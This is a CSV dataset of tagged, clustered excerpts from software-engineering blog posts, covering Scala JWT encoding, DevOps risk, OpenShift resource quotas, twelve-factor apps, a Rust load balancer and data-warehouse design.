,text,tags,cluster
0,"As an example of such approach, lets take a java-jwt library from Auth0. This is a great library for JWT but when it comes to type-safety it has all the drawbacks youd expect from Java library. Encoding and decoding a token looks like this: Or, alternatively, you can get and set all the claims as, you guessed it, Map<String, Claim>Of course Claim isnt anything you can, for instance, pattern-match on; its just an opaque interface with bunch of as Boolean, as Map methods. So, even though the library itself is terrific, in Scala code-base it stands out like a sore thumb. What can you do about it? Ideally, youd like to be able to have a type, saythat encapsulates all the information you might want to put into a JWT token. Of course, youd have to make sure that private claims of type C can be safely (and automatically) encoded and decoded from a token. So, lets code these assumptions first: These signatures tell us that encoding/decoding a JWT token is possible if and only if we know that the type C that were using as private claims is actually a valid Claim. Proof of this fact is obtained by providing an implicit Claims instance.","['Scala', 'Java', 'Api Design']",15
1,"You might be wondering why Repr is not a type parameter but a type member? Its because it doesnt have to be explicitly exposed to Claims consumers. As far as theyre concerned, Claims is a type constructor yielding the type of correct JWT claims given an Of type. When you have Claims[Foo], you know that Foo can be converted into a JWT token and retrieved from it. What you do not need to know is how Foo is represented in this process. This is relevant only to implementations of Claims, thus it is internal to the Claims type.","['Scala', 'Java', 'Api Design']",15
2,"So its turned out that we can build generically Claims for any type that:has labelled representation in form of an HList, andelements of this HList (Field Type) have Claims Encoder and Claims Decoder Now, we need to create an implementation of encoders/decoders for HLists of Field Type[T, Symbol @@ literal]. Dealing with implicits based on recursive types is easyyou must always follow the type structure. HList can be either:emptyrepresented by singleton case object HNil, orconcatenation of _head_ element of type H with an HListrepresented by case class::[+H, +T <: HList](head: H, tail: T)So you need to provide implicit instances for each case:in empty case you, obviously, dont have to decode/encode anythingin non-empty case you have to be able to encode/decode the head (which will be a Field Type) and then, recursively, process the tail The only missing part is the one dealing with fields itself. To encode/decode a field, we need to know its name and its type. Furthermore, the type of the field must be something that our underlying library supports. As weve seennames are encoded as literal types. To get the runtime information we want from such a type, we need to delve into Shapeless once more This being solved, we have to take care of encoding and decoding supported types. Now, what constitutes a supported type? The documentation of java-jwt states that: These types have nothing in common, so we need to use ad-hoc polymorphism to model JWT-enabled types. Well need a type-class for this: If we were confined to types that the original library supports, itd not be that goodfor instance, Scala collections, or Option are not supported. But this mechanism is really extensibleto support new types we just need to provide new instances of Private Claim Type: and, voila, Option and Seq will work. We can even add a generic mechanism for adding new types: With this mechanism in place, we can formulate the final missing bitencoding/decoding single field types ie. we can decode a field, if we have a Witness of its name, and there exists a Private Claim Type for its type.","['Scala', 'Java', 'Api Design']",15
3,"The reasons, as we previously mentioned, used to be economical. What will happen if the whole platform would be built using seven different languages? Which skills a developer for such a platform should have? What will happen if we want to hire enterprise support for each language? How are these things run in production: monitoring, upgrading, infrastructure, and so on? What will happen if we want to provide a corporate software framework to develop different components? Do we have to implement it in seven different languages? Those are just some of the problems that would arise without this constraint. Therefore, what could initially be considered as a limitation (using merely one programming language), becomes a way of saving costs in the future. Obviously, these sorts of constraints lead to drawbacks that have to be analyzed considering the enterprises culture.","['Agile', 'Software Architecture']",12
4,"But, how do these autonomous and fast-paced teams match with a group of principles and restrictions to build a software solution? Will the process of architecting a solution delay the continuous value delivery? Maybe the key point is, how much time do we have to spend on architecting in each iteration? Definitely, theres no easy and specific answer to this question. The most sensible answer would be just enough. The minimum amount of architecture to fulfill the principles, vision, constraints to build a solution. Once again, how much is just enough? It depends on the project/product that is to be built. If we are in a very chaotic project with lots of changes probably the amount of upfront architecture would be lower than more stable projects where doing some design in advance would be easier. As a rule, it would be recommended to do some upfront design at the beginning of the project (Sprint Zero?) Besides, we should include an Architecture review as part of the Definition of Done (Do D) in each user story. Of course within the Sprint Planning, this fact has to be taken into account. It would be worthwhile if at least one of the team members (if not all of them) will be accountable to ensure both product development and Architecture are aligned.","['Agile', 'Software Architecture']",1
5,"However, the assumption that the database technology can generate the identifiers for our domain aggregates again ties us with the data storage system. What if we want to change data storage system with a one which doesnt have a feature of generating auto-increment primary keys? Also, each data storage system has different ways of generating these identifiers which may cause us to end up with a different primitive type. Besides this, these types of keys may not be suitable for a distributed system. For instance, when we have a table in our SQL Server database with generated primary keys, we dont have an easy way to scale this table horizontally in a distributed environment.","['Domain Driven Design', 'Cqrs', 'Distributed Systems', 'Software Architecture', 'Software Development']",8
6,"These concerns could be overcome by letting the unique aggregate identifier generation happen by the consumer of the domain layer (i.e. the transport layer which communicates with the domain layer through commands and queries). This reduces the environment dependency which in turn lets us not to rely on the database for Id generation. This approach also has another benefit: it can support distribution. For instance, we can have a table partitioned onto two physical SQL Servers and split the cost of lookups. If we had an auto-increment key, this wouldnt work with SQL Server for instance.","['Domain Driven Design', 'Cqrs', 'Distributed Systems', 'Software Architecture', 'Software Development']",8
7,"The biggest pain with UUIDs are cost on the storage system both on storage and indexing. These are not big issues for us though. However, there are already established approaches to generating unique identifiers as more efficient primitive types such as 64-bit integer within a distributed system. Twitter Snowflake algorithm is one of them and that sort of led us to choose 64-bit integer over UUID. We are using open source Id Gen library from Rob Janssen, which is a Twitter Snowflake-alike ID generator for.","['Domain Driven Design', 'Cqrs', 'Distributed Systems', 'Software Architecture', 'Software Development']",3
8,"Even when youre not travelling, as a public representative, to an extent youre always on call. You probably get frequent messages from people asking questions, requesting features and reporting bugs. Over time, this can be draining. So what can you do about it? First, make sure that these responsibilities are shared amongst the team. Try to use your team accounts (for example on Twitter) to gather information and respond to people, so that others can pick up the conversation if youre away, or too busy. Also, seeing this will encourage other people to message your team accounts in the future, rather than your personal accounts.","['Developer Relations', 'Burnout', 'Motivation', 'Careers', 'Perfectionism']",0
9,"If you have some tips to share, please leave a comment! Ive been thinking about this topic further since writing this post and I think Ive missed some important points. I know other developer advocates who travel and speak a lot. Yet they dont seem to be getting burnt out? Focusing on our schedules doesnt tell the whole story; it seems that its just as much to do with our motivations and mindset.","['Developer Relations', 'Burnout', 'Motivation', 'Careers', 'Perfectionism']",1
10,"By Brett Luckabaugh, Account Principal, Contino Everyone is familiar with the phrase if you love something, let it go. If it comes back to you, its yours forever. If it doesnt, then it was never meant to be. IT Risk can be a lot like that, it sounds crazy but hear me out for a second. Organizations today are desperate to get to a better place in their IT shops, by adopting Agile, Dev Ops, utilizing Big Data and ML/AI. Most of these companies barely dip their toe into the depths of each of these concepts, while leadership touts their modern IT practices to anyone who will listen. The good news is that most professionals understand the generic direction to take an organization, but almost no one knows the details of how. This blog is going to go into one aspect of that how: managing risk and enabling teams.","['DevOps', 'Risk Management', 'Team Building', 'Agile', 'Data']",12
11,"Here is an exhaustive list of the things many development teams fully own and control: When to take coffee breaks Things development teams do not own and control: What to develop The timeline The budget The tech stack Architecture The development tool set Infrastructure Dev/test/QA/prod environments Code pipelines/Continuous Delivery Data layer/log management/reporting Security controls Operations/maintenance It seems fairly simple to define the narrative of how we got to this state. In an effort to grow their IT capabilities, companies had to hire a lot of people. Some of those people will naturally not be as competent as they should be, and as a result, bad things happen. Unknowing executives, in an effort to save budget, traditionally throw development tasks to outsourced third-parties that crank out code with just enough quality to runfor now. Months or years down the line, something inevitably causes an emergency, such as a critical security vulnerability, extremely antiquated environments (just how many Java 1.4 environments are out there, exactly? ), desire for new features on a tech stack that no one knows how to deal with and many more! Now, part of this problem I blame on finance, which treats everything in the IT space as a project and not a product (I recommend the book Project to Product by Mik Kersten), and as such, the main objective is to produce a working deliverable and I dont have to worry about the maintenance or ops of that thing because by the time it breaks, well all be long gone on a different project, making the same mistakes over and over again. Then, naturally, IT gets a bad rap since the optics make it seem as though everything in their wheelhouse is poor quality and breaks all the time. So, obviously, we have to put controls in place to ensure these emergencies stop happening! Well spend months creating sound, foolproof documents on how vendor A must meet requirement X, and developers can never have any access to any production environment, and the tech stack will be standard across every team so our maintenance team can be cohesive and deal with only one type of problem. Before you know it, you have silos engrained across the entire org and employee fulfillment and happiness breaks through the floor and into the sub basement. At least everyone can show off to the CIO about how we all have a handle on the situation though, right? Except whoops, it never works out quite that way, for multiple reasons: Vendors will either lie about their ability to meet requirements, or do the absolute bare minimum in those areas that are visible to their clients to prove compliance and end delivery may or may not actually be compliant. After an initial review and signoff by the compliance teams, they will be free to do whatever they want.","['DevOps', 'Risk Management', 'Team Building', 'Agile', 'Data']",12
12,Project lead time shoots through the roof. Everything must be passed off to the silo owner. Passing off to QA for validation? Bringing changes up to a change control board and getting signoff?,"['DevOps', 'Risk Management', 'Team Building', 'Agile', 'Data']",0
13,"At this point, Ive hopefully gotten at least a few head nods out of my readers. Much of this is a standard cancer that infests these robust, secure organizations. So robust, so secure in fact, that little gets done. Risk teams are often not risk averse, they are risk nullifying. I often joke that we should be so risk averse that we go take an axe to the datacenter power lines. At least that way we cant be hacked.","['DevOps', 'Risk Management', 'Team Building', 'Agile', 'Data']",16
14,"To get out of this hole, something has to give, and realistically the only possible thing that could give is risk. That means some measure of control has to be given up by centralized IT and handed back to the developers. Yes, that means that developers could potentially break something. Yes, that means that technically a developer could install something the company didnt have a license for, creating legal risk. This means that you must empower your developers to such a degree that they can potentially cause harm. If that scares you so far out of your wits that you couldnt imagine such a future, then maybe you need to take a hard look at the quality of developers youre contracting with or employing. Strong developer empowerment cannot happen when developers are not worthy of that empowerment, and for the longest time developers have been treated as throw-away products, simply code monkeys to take the requirements of the actual smart people (your architects, security professionals, etc.) and then churn out the stuff that makes the app go. We come to a bit of a dilemma here, because I dont assume it is even remotely possible for an IT org stuck in this type of reality to pull itself out by removing all poor performers, then finding the budget to hire absolute top talent, thereby mitigating the risk of developer empowering. To practically address this problem, we need to first take a look at what is possible to lose control of? It is not wise to completely remove all semblance of centralized control overnight; your development teamsand even the management layer on top of themwould have no idea how to handle that much responsibility all at once. Therefore, a nuanced approach is required. Furthermore, it will depend on the capabilities of your org to perform the necessary auditing requirements to ensure that enablement doesnt run away from any semblance of process and control. Heres an example of a good way to handle enabling a team: Lets take a competent development team that has no control over the dev suite theyre dealing with. Perhaps the organization has specified Eclipse as the mandated IDE, even though a substantial portion of the team is more familiar with Intelli J. While the licenses for Intelli J cost money, its a massive sign of goodwill for an organization to reach out and offer to pay for a tool that the developers really enjoy using. This would measurably increase their productivity and work happiness. The risk here is extremely low because the code output of Eclipse and Intelli J is not demonstrably different.","['DevOps', 'Risk Management', 'Team Building', 'Agile', 'Data']",16
15,"Another example that actually does increase risk, is allowing a development team to own and control their own development, and even test environments. While you can simply put down the new mandate that teams are now in control of their own environments, doing that and nothing else increases your risk factor more than is acceptable. For instance, now you run the real risk of having so significant of environment drift across teams that the practice becomes untenable. To mitigate this risk, it is important to not only have policy in place (anyone who opens port 22 to the public internet will be fired), but have some form of automated (or at the very least, manual) auditing procedures in place to check that these policies are actually adhered to. There are tons of ways to automate environmental policy. The reason tollgate owners are so risk averse is because its their butts on the line if they let something through that shouldnt be, so the default behavior is to say no to everything. This is incentivizing the wrong behavior. Policy admins should not be permitted to say no to proposals, they should rather be empowered to determine the best way to ensure adherence to policy via automation and tools.","['DevOps', 'Risk Management', 'Team Building', 'Agile', 'Data']",13
16,"The budget Give developers a financial andon cord that allows them to voice concerns about the budget, and allow them to suggest other vectors of how to handle the problem. Do your developers have a say in potential ways to save money? By challenging the current direction on infrastructure and architecture is there an ability to mitigate cost? The tech stack If a team just really, really likes Go, determine if there is a way to actually allow for this. Is this team going to own the maintenance of the project/product going forward? (hint: they should) If everyone got hit by a truck tomorrow, could you hire more Go experts? The development tool set Give devs the ability to pick their own development tools. If the team wants to utilize Docker on Macbooks, then get them Macbooks and let them install Docker. New tools can absolutely go through a vetting process where things like tool licensing and risk can be managed. Doing this also has the added benefit of encouraging your developers to learn about new technologies, which could potentially be adopted by the rest of the organization.","['DevOps', 'Risk Management', 'Team Building', 'Agile', 'Data']",12
17,"For detailed information, you can refer to his article on 8thlight [1]. So what does this mean for our web app development with Angular? Lets try to apply these points to our beloved framework: Independent of Frameworks: Our business logic and rules should not be affected by any functionality or structure of the Angular framework. This achieves more flexibility when updating to new versions (which may introduce new architecture/project structure) or switching to a completely different frameworkbecause we dont have to rely on any framework specific stuff. And also heads to the next point: Testability! Testable: Naively considered, we only have to test our business logic and rules, that makes testing a lot easier. So to test the core functionality of our application, no Angular specific tests like Karma are needed.","['Clean Architecture', 'Angular', 'Architecture', 'Software Engineering', 'Web Development']",19
18,"This continuous adaptation to business demands in turn has forced technology organizations to adopt a different operating paradigm as well. Instead of designing and creating a fixed enterprise architecture, technology groups increasingly operate new services on top of and next to existing applications. This results in a continually changing landscape of services. Because new services are built on top of existing ones, what used to be regarded as an application becomes an independent digital business capability, ready to support new services as needed. Also, because service landscapes evolve through organic federated growth, i.e. the organic addition of new federations of services, they are ideally suited to provide the business with the technical agility it needs to adapt to business demands.","['Microservices', 'Organic Architecture', 'Service Landscape', 'Agile Organization', 'Emergent Behavior']",12
19,"Always remember to build semantic, well-structured HTML. It takes longer, but its always, always worth it. If you dont feel confident with CSS, use a CSS framework like Bootstrap or Grid. Keep it simple, keep it responsive, and follow standards. Here you can find the latest standards that we apply for CSS. Never underestimate how important it is to write high-quality CSS.","['JavaScript', 'Reactjs', 'Spring Framework', 'Mvc Frameworks', 'Software Architecture']",19
20,"A Passthrough setup is one specific to Network Load Balancing. At least thats been my perception. Similar to the proxy, the client tries connecting to the single load balancer address. Unlike Proxy mode, however, in a Passthrough setup the clients TCP session does not terminate at the load balancer. Instead the packet is processed, manipulated and forwarded onto a backend server. By processed, I mean the necessary connection tracking is in place or updated so future packets from, or back to, the client go to the right place. And by manipulated, I mainly mean the packet is NATed appropriately. The client should think its communicating with the load balancer address the entire time. Ultimately, though the TCP connection terminates at a backend, load balanced server.","['DevOps', 'Load Balancing', 'Rust']",11
21,"Internally, the architecture is a manager-worker model for Passthrough and Direct Server Return (DSR) modes. The low level network package I rely on for these modes (libpnet) is great for building and manipulating packets. It also contains various handy abstractions for listening, sending, and receiving, making it a useful package for network utilities. Some of its operations are blocking, however, and at the IP/TCP layers the abstractions appear to do a fair amount of byte copying. This is nitpicking a bit as I really do find the package very useful and AFAIK there just arent many low level network APIs for Rust yet. For fast filtering and traffic shaping in user space, though, these are limitations. I hope in the future there is some low level network package which supports or abstracts Async operations.","['DevOps', 'Load Balancing', 'Rust']",11
22,"The number of workers are configurable in the Convey toml file, but I noticed right away adjusting this had large effects on performance. Some of that is the locking overhead of shared structures like the connection tracking map. But it turns out Rust uses native threading. This is an incredibly important detail, especially given the packet construction and manipulation operations are all blocking. As far as I can tell, the most idiomatic way to handle these sorts of operations is with an Async runtime. Or maybe the way to go is with synchronous blocking, but with something like netmap (which libpnet apparently supports!). Regardless, with the current implementations native threading model its important to note the number of cores the load balancer will be running on and tuning the workers parameter appropriately.","['DevOps', 'Load Balancing', 'Rust']",11
23,"To run Convey in Passthrough mode, we need a couple iptables rules on the load balancer Whats going on here? Remember, Convey is not terminating any TCP sessions so not binding to any ports in this setup. So when the client tries connecting to the load balancer, the underlying OS tries to be helpful and immediately sends back a TCP SYN,RST. Similarly, when the backend server sends its response packets back to the load balancer, the OS will be disruptive again by responding with a TCP RST. Since Convey runs entirely in user space, the above commands are necessary to drop the packets before they even reach OS connection tracking. However, Convey can still listen to them.","['DevOps', 'Load Balancing', 'Rust']",11
24,"Another difference between DSR and Passthrough is the backend servers must themselves participate in this mode of operation. Since the packet the backend servers receive is addressed to the client, they will do their thing, then send the response directly back to the client. However, the client still thinks its communicating with the load balancer so we need the response packets to look like they came from the load balancer. Some solutions, such as IPVS, use IPIP tunneling to handle this. Convey doesnt handle any such encapsulation so we use an Egress NAT to manipulate the response back to the client. The Egress NAT should alter the source IP to be that of the Convey Load Balancer so from the clients perspective it still thinks its communicating with the load balancer address.","['DevOps', 'Load Balancing', 'Rust']",11
25,"Whether you say yes to REST, so-called-REST, or Graph QL, it is essential that you understand the consequences of the noes you tell to the other styles. What aspect are you buying when you say yes to a particular style? What other properties are you loosing when you say no to others? Chances are you are not a technological company, and you are a product (or service) company. Take a look at the product or service you want to build, what are the business objectives? And dont judge by decisions of others; you are unique.","['GraphQL', 'Rest Api', 'API', 'Software Development']",12
26,"Sales Lofts core platform has thousands of users across various surfaces. Due to unavailability of integrated data, Account Managers, SDRs, CSMs, ISMs are unable to have a 360-degree view of their customers while making crucial decisions. They would also like to explore historical data to identify interesting and valuable connections. Currently, it is a manual, time-consuming process and doesnt allow for understanding historical trends. So, we are asked to design a system which can help them quickly in decision-making and provide a return on investment (ROI). To start designing the data warehouse, we need to follow a few steps.","['Data Warehouse', 'Data Modeling', 'SaaS', 'Cloud', 'Star Schema']",6
27,"Dimensions (tables) contain textual descriptions about the subjects of the business. For example, Customer is a dimension with attributes such as first and last name, birth date, gender, etc. The primary functions of dimensions are to provide filtering, grouping, and labeling on your data. Out of many dimension types, slowly changing dimensions (SCD) are most widely used to capture changes over time and preserve the historical information. Every dimension must have a surrogate primary key (internally generated numerical value column) which finds further use as a foreign key in the dimensional model. This surrogate primary key behaves as a Dimension Key while loading the fact table. It is a best practice to name Surrogate Key column with suffix _SK in the data warehouse.","['Data Warehouse', 'Data Modeling', 'SaaS', 'Cloud', 'Star Schema']",8
28,"One important concept to understand here is the Granularity. It is a measure of the degree of detail in a fact table. The greater the granularity, the deeper the level of detail. This needs to be discussed with key stakeholders before designing the dimensional model. In our case, granularity at the Day level provides the required depth for business reporting. Fact tables can be separated by granularity and subject area. Fact tables have foreign key relationships with their respective Conformed Dimensions.","['Data Warehouse', 'Data Modeling', 'SaaS', 'Cloud', 'Star Schema']",14
29,"After the groundwork of designing the dimensions and measures is complete, we now have to use appropriate schema to relate these dimension and Fact tables. Popular schemas used to develop dimensional model are Star Schema, Snow Flake Schema, etc. However, which schema suits which business case is a design question for another article. The simplest and most widely used is a Star schema to develop data marts. The star schema resembles a star, with points radiating from a center. The center of the star consists of the fact table, and the points of the star are the dimension tables.","['Data Warehouse', 'Data Modeling', 'SaaS', 'Cloud', 'Star Schema']",14
30,"A quota in Open Shift is a defined range for resources such as CPU, memory, pods, and storage. You can set request minimums, limits, or both across CPU and memory. You can specify maximum (including 0 Mi) on storage space. And you can specify a maximum number of pods to allow in your namespace. Quotas are important as they can set request level minimums of resources such as CPU and memory for your application. This way you are guaranteed to have at least that minimum set of resources for your namespace. It also sets limits on CPU, memory and the number of pods so you do not have any runaway processes or problems with maxing out resources on nodes and hostile takeovers or internal DOS attacks. Quotas also help create hardware resources that are more dense and do not waste space or computing power in your on-premise or cloud (or hybrid) data center.","['Kubernetes', 'Openshift', 'Quota', 'Resources']",3
31,"Kubernetes within Open Shift is charged with watching the quotas as well as figuring out resource loads and usage across all worker notes for deployments. The quotas give guardrails on resources so you do not have 1 pod taking over all of a nodes CPU and memory or taking more storage than they are allowed. Everything in moderation as they say! To do this properly you really should know the total memory and CPU cores of your worker nodes. With the oc command line interface you can run oc get nodes and then oc describe node xxxxxxxxx with the name of the node to get the CPU and memory utilization on those pods with quotas set (if you have permissions to do so). Or ask your server team, admin, or SRE if they know the number of worker nodes, and the CPU cores and memory allocated to each of them. You can use monitoring software to get this as well for sure on true enterprise implementations. Get those numbers so you know if your resource quotas even make sense. Then go on to what is next.","['Kubernetes', 'Openshift', 'Quota', 'Resources']",11
32,"That is what I get presented with ALL THE TIME. What do you set them to? As with any hard question in the computer science realm, it will depend on a few things such as usage, code language, routines in the code, etc. It also depends on developers knowing what their code does, what resources it needs, and what parts of the code are the most intensive. If they do not know enough about that, be forewarned: YOU will have to find out and you will get pissed at them for not knowing their own architecture well enough. There are many developers I know that still struggle with the ports, protocols, and services their application requires. Developers in the Open Shift/k8s space need to get smarter on this and we need to help them get there. (I have now put down my soapbox and stored it securely. )I have spent some time testing things and have a good estimation (so far) of where to start on my projects for.","['Kubernetes', 'Openshift', 'Quota', 'Resources']",9
33,"NET Core, Node JS, keycloak gatekeeper, etc. (And by working with smart guys like my co-worker Mike S. and brainstorming.) That does not help anyone else in the world at all unless we share that information. So that is what I am doing here. Sharing what I have to help someone else get to the crest of the learning curve far faster. Below is a sample quota for my simple People API microservice.","['Kubernetes', 'Openshift', 'Quota', 'Resources']",6
34,"This is what I have found: For Java based applications I have used a request CPU of at least 500m (500 millicores or 1/2 of a CPU core) and depending on the application a limit of 1 CPU or 1500 millicores. For memory of Java applications I have used 500Mi to start and up to 2Gi if an intense application or API. I have actually had to increase to more than that when testing RStudio in a container as it is memory and CPU intensive depending on what you are doing. But this is a good start. (And remember, not everything is made to run in a container just because it can. )For Node JS I have used 250m and 750m for the CPU millicores of request and limit. And Memory I have used 250Mi and 500Mi for APIs in Node JS.","['Kubernetes', 'Openshift', 'Quota', 'Resources']",3
35,"Again these are a starting point to start experimenting with, not a definite range as each application will be unique on requirements. You have to start somewhere and you have to test and retest with quotas in place in a development environment and a test or staging environment (without development and build tools sharing your namespace). As you test your application based on processing or calling routes and watching the operations, keep your eyes on a few things. Watch the latency, not just the first time you run something but subsequent times you are calling your application. Use JMeter or something else if you want to automate this and stress it out. Also check the deployment logs and check for OOM (out of memory) errors which I saw with my.","['Kubernetes', 'Openshift', 'Quota', 'Resources']",11
36,"Your deployment strategy comes into play here as well. A Recreate strategy means destroy the pod and then recreate it. So you will not be adding resources when you do this strategy as the old one is dead and the new one takes over. However, a Rolling strategy means whatever you resource usage is for that pod you must DOUBLE for the request and the limit or you will run into a resource quota issue. Your requirements will dictate rolling or recreate strategies. More than likely a development project can allow recreate, however production and staging or testing will probably need a rolling deployment. So you have to work that into your math for the resources required.","['Kubernetes', 'Openshift', 'Quota', 'Resources']",8
37,"Also keep in mind: you can use base-2 type numbers (1024) for binary sizing or you can use decimal (i.e. 1,000) sizing when specifying resources and quotas. I have no idea why this is the case. My guess is that marketecture (marketing architecture) starting using 1000 MB for 1 GB and it somehow got into here unfortunately. So when you specifying things in Mi or Gi, that is the regular (in my mind) 1024 MB = 1 GB versus M or G which is 1000 M = 1 G. Use one type consistently, binary or decimal, and make sure your math adds up correctly! Or it will boggle your mind how you are out of resources when you are testing. Trust methe face palm emoji would go well here.","['Kubernetes', 'Openshift', 'Quota', 'Resources']",3
38,"Another catch I found: if you apply a quota with a running deployment that has no requests or limits (whether creating a quota or deleting one) you must redeploy all your pods to have that change take effect. And if your redeployment runs into a quota limit and will not deploy, you may have to scale to 0 and then redeploy and then scale back up to 1. However, once you have the quota working correctly it does guardrail your project from running out of control and taking over a whole node or more! So it is worth figuring out. A good thing to note: if your pod was already deployed with set requests and limits then it will appear within the quota when you apply the quota.","['Kubernetes', 'Openshift', 'Quota', 'Resources']",11
39,Use Minishift or Minikube or a k8s implementation in Vagrant or on AWS or somewhere to see how you can setup your quotas. How they stop you from going haywire on resource consumption. And how you can develop some methods and baselines for using good resources yourself for you and your team. It will help you in the long run in production for sure. It has helped me quite a bit.,"['Kubernetes', 'Openshift', 'Quota', 'Resources']",10
40,"The problem with the not-really-defined cloud architecture led to the creation of the idea of the application architecture which performs well in the cloud. It should not be limited to the specific platform or infrastructure, but a set of universal rules that help developers bootstrap their applications. The answer to that problem was constituted in Heroku, one of the first commonly used Paa S platforms. Its a concept of twelve-factor applications which is still applicable nowadays but also endlessly extended as the environment of cloud platforms and architectures mutate. That concept was extended in a book by Kevin Hoffman, titled Beyond Twelve-Factor App to the number of 15 factors. Despite the fact that the list is not the one and only solution to the problem, it has been successfully applied by a lot of companies. The order of factors is not important, but in this article, I have tried to preserve the order from the original webpage to make the navigation easier. There is one codebase per application which is tracked in revision control (GIT, SVNdoesnt matter which one). However, a shared code between applications does not mean that the code should be duplicatedit can be yet another codebase which will be provided to the application as a component, or even better, as a versioned dependency. The same codebase may be deployed to multiple different environments and has to produce the same release. The idea of one application is tightly coupled with the single responsibility pattern. A single repository should not contain multiple applications or multiple entry pointsit has to be a single responsibility, a single execution point code that consists of a single microservice.","['Docker', 'Cloud Native', 'Application Development', 'Twelve Factor']",10
41,"This guideline is about storing configuration in the environment. To be explicit, it also applies to the credentials which should also be securely stored in the environment using, for example, solutions like Cred Hub or Vault. Please mind that at no time the credentials or configuration can be a part of the source code! The configuration can be passed to the container via environment variables or by files mounted as a volume. It is recommended to think about your application as if it was open source. If you feel confident to push all the code to a publicly accessible repository, you have probably already separated the configuration and credentials from the code. An even better way to provide the configuration will be to use a configuration server such as Consul or Spring Cloud Config.","['Docker', 'Cloud Native', 'Application Development', 'Twelve Factor']",7
42,"All parts of the deployment process should be strictly separated. First, the artifact is created in the build process. This means the artifact can be deployed to any environment as the configuration is separated and applied in the release process. The release artifact is unique per environment as opposed to the build artifact which is unique for all environments. This means that there is one build artifact for the dev, test and prod environments, but three release artifacts (each for each environment) with specific configuration included. Then the release artifact is being run in the cloud. Kevin adds to this list yet another discrete part of the processthe design which happens before the build process and includes (but is not limited) to selecting dependencies for the component or the user story.","['Docker', 'Cloud Native', 'Application Development', 'Twelve Factor']",18
43,"Execute the application as one or more stateless processes. One of the self-explanatory factors, but somehow also the one that creates a lot of confusion among developers. How can my service be stateless if I need to preserve user data, identities or sessions? In fact, all of this stateful data should be saved to the backing services like databases or file systems (for example Amazon S3, Azure Blob Storage or managed by services like Ceph). The filesystem provided by the container to the service is ephemeral and should be treated as volatile. One of the easy ways to maintain microservices is to always deploy two load balanced copies. This way you can easily spot an inconsistency in responses if the response depends on locally cached or stateful data.","['Docker', 'Cloud Native', 'Application Development', 'Twelve Factor']",11
44,"The administrative and management processes should be run as one-off. This actually self-explanatory and can be achieved by creating Concourse pipelines for the processes or by writing Azure Function/AWS Lambdas for that purpose. This list concludes all factors provided by Heroku team. Additional factors added to the list in Beyond Twelve-Factor App are: Applications can be deployed into multiple instances which means it is not viable anymore to connect and debug the application to find out if it works or what is wrong. The application performance should be automatically monitored, and it has to be possible to check the application health using automatic health checks. Also, for specific business domains telemetry is useful and should be included to monitor the current and past state of the application and all resources.","['Docker', 'Cloud Native', 'Application Development', 'Twelve Factor']",11
45,"The way to succeed in the rapidly changing and evolving cloud world is not only to create great code and beautiful, stateless services. The key is to adapt to changes and market need to create the product that is appreciated by the business. The best fit for that is to adopt the agile or lean process, extreme programming, pair programming. This allows the rapid growth in short development cycles which also means quick market response. When the team members think that their each commit is a candidate to production release and work in pairs the quality of the product improves. The trick is to apply the processes as widely as possible, because very often, as in Conways law, the organization of your system is only as good as organizational structure of your company.","['Docker', 'Cloud Native', 'Application Development', 'Twelve Factor']",12
46,"Physics and software technology What has all that to do with software technology? In 2017, all the experiments of CERN together generated 72 petabytes of data. Not only data that comes directly from the experiments, but also conditions data which is non-event experiment data describing the state of the detector at the time of data taking. This data has to be stored so that it is accessible, manageable, and analyzable. That asks for a smart way of designing and implementing a proof of concept for conditions database for SHi P experiment. That is where the talented software engineers of the PDEng ST program come in.","['Science', 'Cern', 'Database Development', 'Software Engineering']",5
47,"How did the project team manage to make such progress in just a few weeks time? Megerdoumian: To manage this, we used an agile approach, the team operated cross-functional, and was committed to realize the common goals we set each sprint. She continues: We tried to achieve specific level of quality, assured with QA rankings. And we also had continuous integration, which helped us to manage the time of building and delivering the project. Pranav Bhatnagar, Team Leader and SCRUM master, adds: One of the major non-functional requirements from clients side was to keep the code as short as possible and in addition really easy to use for scientists at CERN, whereby they wouldnt have to write more than one line command to retrieve from or enter the data into the database. I can proudly say that the development team successfully manage to achieve that and the Clients feedback was very positive towards that.","['Science', 'Cern', 'Database Development', 'Software Engineering']",1
48,"Implementation of the trainees work After the final presentation at CERN, the PDEng ST trainees handed over the project deliverables to CERN. They will further test and implement the work of the trainees. But we will definitely keep in touch with them to ask them for advice, says Van Herwijnen. And when asked about when the implementation will take place, he says: Unfortunately, the proof of concept could not be implemented in time for our test beam this summer. But we will make sure the conditions database is in place for our second test run. If everything goes according to plan, the SHi P experiment will be approved in 2020. And perhaps this will result in some new pieces to fill in the puzzle that explains the origin of our existence.","['Science', 'Cern', 'Database Development', 'Software Engineering']",5
49,"The format is (as those who read my column may know by now) Turtle, or Terse RDF Language. A real record may be considerably longer and more complex, of course, but this is enough to illustrate the point. It is typical of the type of information you would expect in a triple store. The URI identifier for this particular aircraft instance is in the first line: aircraft:_7478f1abc. Theres nothing really magical in this identifier; the real magic is the fact that it would be considered globally unique, through the magic of namespaces, which would render the condensed URI form (or curie) as the string: In a perfect world, all of this information would be contained within one database table. Alas, the world is almost inevitably not perfect, and this kind information more than likely originated from two or more tables, possibly even different tables from different databases.","['Data Catalogs', 'Semantics', 'Data Modeling', 'Thecaglereport']",8
50,"Word got around, and the system started to grow. Problems were solved, and users were happy. Slowly, people noticed problems as the system grew. Some requests were slow, the data store started to get expensive. On-call pagers started to get noisier. Eventually, an engineer realised that most of the problems can be solved by adding a cache.","['Reliability Engineering', 'Cache', 'Software Development', 'Software Engineering', 'Systems Thinking']",17
51,"A cache is a quick solution to an age-old problem. Getting data from the data store is too slow. The cache keeps the most relevant data near-by, in memory, with the speed of your favourite hash table. The engineer adds a contingency: IF the data is not available in the cache THEN check the data store. They know that the cache might not have the data needed, but they also know that the cache is a good first guess. A particularly diligent engineer might even set a timeout on the call to the cache! The cache works well, and the system begins to scale once more. Users stop complaining and pagers go quiet. Management is happy because they can cut costs on that expensive data store.","['Reliability Engineering', 'Cache', 'Software Development', 'Software Engineering', 'Systems Thinking']",8
52,"The system edges closer to the boundary every day. People dont really think about it because its an abstraction; a theoretical risk. Further, the boundary is fuzzy, more like a probability map. One day you do something and everything is fine, but the day after someone else does the same thing and the whole system plunges off a cliff. Everyone looks around and asks how did we get here? Its like walking up a stair-case in your home that has a rotten support structure. Each step looks fine, then one day your foot goes through the 4th step and you break your ankle.","['Reliability Engineering', 'Cache', 'Software Development', 'Software Engineering', 'Systems Thinking']",14
